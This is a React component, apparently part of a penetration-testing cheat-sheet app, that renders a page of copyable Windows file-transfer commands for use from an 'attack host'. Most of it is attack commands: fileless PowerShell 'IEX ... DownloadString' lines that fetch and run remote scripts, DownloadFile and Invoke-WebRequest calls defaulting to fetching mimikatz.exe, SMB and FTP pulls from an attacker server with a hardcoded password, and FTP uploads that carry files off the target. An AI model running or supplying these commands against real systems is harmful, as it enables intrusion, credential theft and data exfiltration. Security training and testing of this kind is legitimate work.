import React from 'react';
import PersistedState from 'use-persisted-state';
import { Typography, Row, Col, Divider, Input, Space } from 'antd';
import { WifiOutlined, createFromIconfontCN, FolderOutlined, FileDoneOutlined } from '@ant-design/icons';
import { Ipv4TcpCacheState } from "components/types/Ipv4TcpCacheState";
import Link from 'antd/es/typography/Link';


const { Title, Paragraph, Text } = Typography;
const IconFont = createFromIconfontCN( {
    scriptUrl: [ './iconfont.js' ]
} );

export default function FileTransfer () {
    const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );

    const [ values, setValues ] = useIPv4State( {
        ip: '',
        port: '',
        target_file_name: 'http://10.0.0.1/mimikatz.exe',
        output_file_name: 'mimikatz.exe',
    } );

    const handleChange = ( name: string ) => ( event: { target: { value: string } } ) => {
        setValues( { ...values, [ name ]: event.target.value } );
    };

    const fileDownload = `(New-Object Net.WebClient).DownloadFile('${ values.target_file_name }','${ values.output_file_name }')`
    const fileDownloadAsync = `(New-Object Net.WebClient).DownloadFileAsync('${ values.target_file_name }','${ values.output_file_name }')`
    const fileLessIEX = `IEX (New-Object Net.WebClient).DownloadString('${ values.target_file_name }')`
    const fileLessIEXPipe = `(New-Object Net.WebClient).DownloadString('${ values.target_file_name }') | IEX`
    const iwr = `iwr -Uri '${ values.target_file_name }' -OutFile '${ values.output_file_name }'`
    const InvokeWebRequest = `Invoke-WebRequest -Uri '${ values.target_file_name }' -OutFile '${ values.output_file_name }'`
    const copyFromSmb = `copy \\\\${ values.ip }\\${ values.output_file_name }`
    const mountShareWithPasswords = `net use z: \\\\${ values.ip }\\share /user:johnDoe Sup3rP@ssw0rd!`
    const DownloadFromFTP = `(New-Object System.Net.WebClient).DownloadFile('ftp://${ values.ip }/${ values.output_file_name }','${ values.output_file_name }')`
    const scriptFTP = `echo open ${ values.ip } ${ values.port } > ftp.txt
echo USER anonymous >> ftp.txt
echo GET ${ values.output_file_name } >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt`
    const powershellFTPUpload = `(New-Object System.Net.WebClient).UploadFile('ftp://${ values.ip }/${ values.output_file_name }','C:\\Users\\Public\\${ values.output_file_name }')`
    const scriptUploadFTP = `echo open ${ values.ip } ${ values.port } > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo PUT ${ values.output_file_name } >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt`

    return (
        <div>
            <div>
                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                    Windows File Transfer Methods
                </Title>
                <Paragraph style={{ margin: 15 }}>
                    Over the past few years, the Windows operating system has evolved and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can be helpful to both attackers and defenders alike. Attackers can use various file transfer methods to operate and avoid being caught.
                </Paragraph>
                <div style={{ padding: 15 }}>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={12}>
                            <Input
                                maxLength={15}
                                prefix={<WifiOutlined />}
                                name='Ip adress'
                                placeholder='IP Address or domain (ex: 212.212.111.222)'
                                onChange={handleChange( 'ip' )}
                                value={values.ip}
                            />
                        </Col>
                        <Col span={12}>
                            <Input
                                maxLength={5}
                                prefix={<IconFont type='icon-Network-Plug' />}
                                name='Port'
                                placeholder='Port (ex: 1337)'
                                onChange={handleChange( 'port' )}
                                value={values.port}
                            />
                        </Col>
                    </Row>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }} style={{ marginTop: 15 }}>
                        <Col span={12}>
                            <Input
                                prefix={<FolderOutlined />}
                                name='File name'
                                placeholder='URL (ex: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)'
                                onChange={handleChange( 'target_file_name' )}
                                value={values.target_file_name}
                            />

                        </Col>
                        <Col span={12}>
                            <Input
                                prefix={<FileDoneOutlined />}
                                name='File name'
                                placeholder='Output file (ex: PowerView.ps1)'
                                onChange={handleChange( 'output_file_name' )}
                                value={values.output_file_name}
                            />
                        </Col>
                    </Row>
                </div>
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Space direction='vertical'>
                    <Title level={3}>
                        PowerShell Download File Method
                    </Title>
                    <Text>
                        We can specify the class name <Text keyboard>Net.WebClient</Text> and the method <Text keyboard>DownloadFile</Text> with the parameters corresponding to the URL of the target file to download and the output file name.
                    </Text>
                    <Title level={4}>File Download</Title>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileDownload}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileDownloadAsync}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Space direction='vertical'>
                    <Title level={3}>
                        PowerShell DownloadString - Fileless Method
                    </Title>
                    <Text>
                        Fileless attacks work by using some operating system functions to download and execute the payloads. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the <Text keyboard>Invoke-Expression</Text> command or the alias <Text keyboard>IEX</Text>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileLessIEX}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {fileLessIEXPipe}
                            </Text>
                        </pre>
                    </Text>
                    <Title level={4}>PowerShell Invoke-WebRequest</Title>
                    <Text>
                        From PowerShell 3.0 onwards, the <Text keyboard>Invoke-WebRequest</Text> cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases <Text keyboard>iwr</Text>, <Text keyboard>curl</Text>, and <Text keyboard>wget</Text> instead of the <Text keyboard>Invoke-WebRequest</Text> full name.
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {InvokeWebRequest}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {iwr}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <Divider dashed />
            <div style={{ padding: 15, marginTop: 15 }}>
                <Space direction='vertical'>
                    <Title level={3}>
                        SMB Downloads
                    </Title>
                    <Text>
                        The SMB protocol that runs on port <Text strong>TCP/445</Text> is most commonly found in enterprise networks where Windows services are running. It allows applications and users to transfer files between and between remote servers.
                    </Text>
                    <Text>
                        We can use SMB to download files from our attacker machine easily. We need to create an SMB server in our machine with <Link href='https://github.com/fortra/impacket/blob/master/examples/smbserver.py' target="_blank">smbserver.py</Link> from Impacket and then use <Text keyboard>copy</Text>, <Text keyboard>move</Text>, PowerShell <Text keyboard>Copy-Item</Text>, or any other tool that allows connection to SMB.
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo impacket-smbserver share -smb2support /tmp/smb_share
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {copyFromSmb}
                            </Text>
                        </pre>
                    </Text>
                    <Text italic>New versions of Windows block unauthenticated guest access!</Text>
                    <Text italic>To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:</Text>
                    <Text>
                        <pre>
                            <Text copyable editable>
                                sudo impacket-smbserver share -smb2support /tmp/smbshare -user johnDoe -password Sup3rP@ssw0rd!
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {mountShareWithPasswords}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <Divider dashed />
            <div style={{ padding: 15, marginTop: 15 }}>
                <Space direction='vertical'>
                    <Title level={3}>
                        FTP Downloads
                    </Title>
                    <Text>
                        Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.
                    </Text>
                    <Text>
                        We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo pip3 install pyftpdlib
                            </Text>
                        </pre>
                        <Text italic underline>By default, pyftpdlib uses port 2121. We can change it with the -p / --port option!</Text>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo python3 -m pyftpdlib --port 21
                            </Text>
                        </pre>
                    </Text>
                    <Title level={4}>Transfering Files from an FTP Server Using PowerShell</Title>
                    <Text>
                        <pre>
                            <Text copyable editable>
                                {DownloadFromFTP}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {scriptFTP}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
            <div style={{ padding: 15, marginTop: 15 }}>
                <Space direction='vertical'>
                    <Title level={3}>
                        FTP Uploads
                    </Title>
                    <Text>
                        Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                sudo python3 -m pyftpdlib --port 21 --write
                            </Text>
                        </pre>
                    </Text>
                    <Title level={4}>PowerShell Upload File</Title>
                    <Text>
                        <pre>
                            <Text copyable editable>
                                {powershellFTPUpload}
                            </Text>
                        </pre>
                    </Text>
                    <Text>
                        <pre>
                            <Text copyable>
                                {scriptUploadFTP}
                            </Text>
                        </pre>
                    </Text>
                </Space>
            </div>
        </div>
    );
}